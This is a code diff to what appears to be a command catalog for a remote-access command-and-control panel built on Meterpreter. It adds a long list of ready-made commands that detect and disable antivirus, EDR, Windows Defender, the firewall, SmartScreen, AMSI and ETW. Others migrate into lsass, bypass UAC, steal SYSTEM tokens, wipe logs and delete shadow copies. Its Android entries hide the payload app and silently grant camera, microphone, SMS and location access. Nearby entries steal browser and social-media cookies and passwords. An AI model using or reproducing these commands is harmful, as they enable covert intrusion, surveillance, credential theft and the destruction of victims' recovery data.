@@ -163,7 +163,71 @@ const COMMAND_CATALOG: C2Command[] = [
   { id: "instagram_cookies",    name: "run post/android/capture/app_data -p com.instagram.android",  category: "Root/Android", description: "Pull Instagram session cookies" },
   { id: "facebook_cookies",     name: "run post/android/capture/app_data -p com.facebook.katana",    category: "Root/Android", description: "Pull Facebook session data" },
 
-  // ── Browser / Windows ─────────────────────────────────────────
+  // ── AV / EDR Evasion ─────────────────────────────────────────
+  // Detection
+  { id: "ev_av_detect",        name: "execute -H -f cmd.exe -a '/c sc query type= all | findstr /i \"antivirus avg avast eset norton mcafee bitdefender kaspersky malwarebytes crowdstrike sentinelone cylance carbon sophos trend\"'", category: "Evasion", description: "Detect running AV/EDR services" },
+  { id: "ev_av_procs",         name: "execute -H -f cmd.exe -a '/c tasklist | findstr /i \"MsMpEng avastui avgui egui bdservicehost cyoptics sentinelAgent CylanceSvc CarbonBlack CsAgent MSSense bdredline WRSA SophosUI ntrtscan uiseagnt'\"", category: "Evasion", description: "List known AV/EDR processes" },
+  { id: "ev_wmi_av",           name: "execute -H -f powershell.exe -a \"-c Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select displayName,productState | ConvertTo-Json\"", category: "Evasion", description: "WMI SecurityCenter2 AV product list" },
+  { id: "ev_edr_reg",          name: "execute -H -f cmd.exe -a '/c reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 2>nul & reg query HKLM\\SYSTEM\\CurrentControlSet\\Services 2>nul | findstr /i \"crowdstrike sentinel carbon cylance sophos\"'", category: "Evasion", description: "Check registry for EDR startup keys" },
+  { id: "ev_fw_status",        name: "execute -H -f cmd.exe -a '/c netsh advfirewall show allprofiles state'", category: "Evasion", description: "Check Windows firewall status" },
+
+  // Windows Defender
+  { id: "ev_def_status",       name: "execute -H -f powershell.exe -a \"-c Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled | ConvertTo-Json\"", category: "Evasion", description: "Get Defender real-time protection status" },
+  { id: "ev_def_disable_ps",   name: "execute -H -f powershell.exe -a \"-c Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableAntiSpyware $true\"", category: "Evasion", description: "Disable Defender via PowerShell cmdlet", dangerous: true },
+  { id: "ev_def_disable_reg",  name: "execute -H -f cmd.exe -a '/c reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f & reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f'", category: "Evasion", description: "Disable Defender via Group Policy registry", dangerous: true },
+  { id: "ev_def_exclusion",    name: "execute -H -f powershell.exe -a \"-c Add-MpPreference -ExclusionPath C:\\ -ExclusionExtension '.exe','.ps1','.dll'\"", category: "Evasion", description: "Add full C:\\ exclusion to Defender", dangerous: true },
+  { id: "ev_def_service",      name: "execute -H -f cmd.exe -a '/c sc config WinDefend start= disabled & net stop WinDefend & sc config SecurityHealthService start= disabled'", category: "Evasion", description: "Stop & disable Defender service", dangerous: true },
+  { id: "ev_def_tamper_off",   name: "execute -H -f powershell.exe -a \"-c Set-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features -Name TamperProtection -Value 0\"", category: "Evasion", description: "Disable Defender tamper protection (requires SYSTEM)", dangerous: true },
+  { id: "ev_smartscreen_off",  name: "execute -H -f reg.exe -a 'add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System /v EnableSmartScreen /t REG_DWORD /d 0 /f'", category: "Evasion", description: "Disable SmartScreen filter", dangerous: true },
+
+  // Firewall
+  { id: "ev_fw_disable",       name: "execute -H -f cmd.exe -a '/c netsh advfirewall set allprofiles state off'", category: "Evasion", description: "Disable Windows Firewall (all profiles)", dangerous: true },
+  { id: "ev_fw_rule_add",      name: "execute -H -f cmd.exe -a '/c netsh advfirewall firewall add rule name=\"svchost\" dir=in action=allow protocol=TCP localport=4444'", category: "Evasion", description: "Add firewall rule to allow C2 port 4444" },
+
+  // AMSI & ETW bypass
+  { id: "ev_amsi_bypass",      name: "execute -H -f powershell.exe -a \"-enc JABhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAPQAkAHQAcgB1AGUA\"", category: "Evasion", description: "Patch AMSI via reflection (AmsiInitFailed=true)", dangerous: true },
+  { id: "ev_amsi_dll_patch",   name: "execute -H -f powershell.exe -a \"-c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"", category: "Evasion", description: "Disable AMSI scan interface via .NET reflection", dangerous: true },
+  { id: "ev_etw_patch",        name: "execute -H -f powershell.exe -a \"-c $a=[Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider');$b=$a.GetField('m_enabled','NonPublic,Instance');[System.Runtime.InteropServices.Marshal]::WriteInt32([System.Runtime.InteropServices.Marshal]::ReadIntPtr($b.GetValue([System.Diagnostics.Eventing.EventProvider]::new([System.Guid]::NewGuid()))),0)\"", category: "Evasion", description: "Patch ETW (Event Tracing for Windows) to NOP", dangerous: true },
+  { id: "ev_scriptblock_log",  name: "execute -H -f powershell.exe -a \"-c Set-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 0\"", category: "Evasion", description: "Disable PowerShell script block logging" },
+  { id: "ev_clm_bypass",       name: "execute -H -f powershell.exe -a \"-c $env:__PSLockdownPolicy=0; [System.Management.Automation.LanguageMode]\"", category: "Evasion", description: "Bypass Constrained Language Mode" },
+
+  // Process injection / migration
+  { id: "ev_migrate_explorer", name: "run post/windows/manage/migrate PPID_SPOOF=true NAME=explorer.exe", category: "Evasion", description: "Migrate Meterpreter into explorer.exe", dangerous: true },
+  { id: "ev_migrate_svchost",  name: "run post/windows/manage/migrate NAME=svchost.exe",                  category: "Evasion", description: "Migrate into svchost.exe (SYSTEM)", dangerous: true },
+  { id: "ev_migrate_lsass",    name: "run post/windows/manage/migrate NAME=lsass.exe",                    category: "Evasion", description: "Migrate into lsass.exe (memory dump protection)", dangerous: true },
+  { id: "ev_inject_shellcode", name: "run post/windows/manage/shellcode_inject",                          category: "Evasion", description: "Inject shellcode into remote process" },
+  { id: "ev_hollow_process",   name: "run post/windows/manage/process_hollowing",                         category: "Evasion", description: "Process hollowing (spawn + replace image)" },
+  { id: "ev_reflective_dll",   name: "load reflective_dll",                                               category: "Evasion", description: "Load reflective DLL (in-memory, no disk)" },
+  { id: "ev_ppid_spoof",       name: "run post/windows/manage/ppid_spoof",                                category: "Evasion", description: "Spoof parent PID to evade behavioral detection" },
+
+  // UAC bypass techniques
+  { id: "ev_uac_fodhelper",    name: "run exploit/windows/local/bypassuac_fodhelper",                     category: "Evasion", description: "UAC bypass via fodhelper.exe (Win10+)" },
+  { id: "ev_uac_eventvwr",     name: "run exploit/windows/local/bypassuac_eventvwr",                      category: "Evasion", description: "UAC bypass via eventvwr.exe (Win7-10)" },
+  { id: "ev_uac_comhijack",    name: "run exploit/windows/local/bypassuac_comhijack",                     category: "Evasion", description: "UAC bypass via COM object hijacking" },
+  { id: "ev_uac_sdclt",        name: "run exploit/windows/local/bypassuac_sdclt",                         category: "Evasion", description: "UAC bypass via sdclt.exe" },
+  { id: "ev_uac_wscript",      name: "run exploit/windows/local/bypassuac_injection_winsxs",              category: "Evasion", description: "UAC bypass via WinSxS DLL injection" },
+
+  // Token & privilege
+  { id: "ev_token_steal",      name: "use incognito\nsteal_token 4",                                      category: "Evasion", description: "Steal SYSTEM token from PID (default 4=SYSTEM)", needsParam: true, paramLabel: "PID", paramPlaceholder: "4" },
+  { id: "ev_impersonate",      name: "use incognito\nimpersonate_token \"NT AUTHORITY\\\\SYSTEM\"",        category: "Evasion", description: "Impersonate NT AUTHORITY\\SYSTEM token" },
+  { id: "ev_lsa_protect_off",  name: "run post/windows/manage/lsa_protection_off",                        category: "Evasion", description: "Disable LSA Protection (PPL) for credential dumping" },
+
+  // Log & forensic clearing
+  { id: "ev_clear_all_logs",   name: "clearev",                                                            category: "Evasion", description: "Clear Security, System, Application event logs", dangerous: true },
+  { id: "ev_clear_ps_hist",    name: "execute -H -f powershell.exe -a \"-c Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -EA 0; Clear-History\"", category: "Evasion", description: "Wipe PowerShell command history" },
+  { id: "ev_clear_mru",        name: "execute -H -f cmd.exe -a '/c reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs /f & reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f'", category: "Evasion", description: "Clear Windows Recent Documents & Run MRU" },
+  { id: "ev_clear_prefetch",   name: "execute -H -f cmd.exe -a '/c del /q /f C:\\Windows\\Prefetch\\*.pf 2>nul'", category: "Evasion", description: "Delete Windows Prefetch files (execution traces)" },
+  { id: "ev_clear_recycle",    name: "execute -H -f cmd.exe -a '/c rd /s /q C:\\$Recycle.Bin 2>nul'",     category: "Evasion", description: "Empty Recycle Bin" },
+  { id: "ev_timestomp_sys",    name: "timestomp C:\\Windows\\System32\\svchost.exe -m \"-30d\"",          category: "Evasion", description: "Timestomp svchost.exe to confuse forensics" },
+  { id: "ev_disable_vss",      name: "execute -H -f cmd.exe -a '/c vssadmin delete shadows /all /quiet & bcdedit /set {default} recoveryenabled No & bcdedit /set {default} bootstatuspolicy ignoreallfailures'", category: "Evasion", description: "Delete VSS shadow copies & disable recovery", dangerous: true },
+
+  // Android security
+  { id: "ev_play_protect_off", name: "execute -f /system/bin/sh -a '-c \"pm disable com.google.android.gms.phenotype 2>/dev/null; settings put global package_verifier_enable 0; settings put secure install_non_market_apps 1\"'", category: "Evasion", description: "Disable Google Play Protect & sideload restriction" },
+  { id: "ev_knox_disable",     name: "execute -f /system/bin/sh -a '-c \"pm disable com.samsung.android.knox.containeragent 2>/dev/null; settings put secure knox_container_ready 0\"'", category: "Evasion", description: "Disable Samsung Knox container (root required)" },
+  { id: "ev_android_hide",     name: "hide_app_icon",                                                     category: "Evasion", description: "Hide payload app icon from launcher" },
+  { id: "ev_android_perms",    name: "execute -f /system/bin/sh -a '-c \"pm grant $(pm list packages | grep -i utility | cut -d: -f2) android.permission.READ_CONTACTS android.permission.RECORD_AUDIO android.permission.CAMERA android.permission.ACCESS_FINE_LOCATION android.permission.READ_SMS 2>/dev/null\"'", category: "Evasion", description: "Auto-grant all dangerous permissions silently" },
+
+  // Browser / Windows ─────────────────────────────────────────
   { id: "chrome_cookies",       name: "run post/multi/gather/chrome_cookies",                       category: "Browser", description: "Steal Chrome cookies" },
   { id: "chrome_passwords",     name: "run post/multi/gather/chrome_passwords",                     category: "Browser", description: "Steal Chrome saved passwords" },
   { id: "chrome_history",       name: "run post/multi/gather/chrome_local_data",                    category: "Browser", description: "Dump Chrome browsing history" },
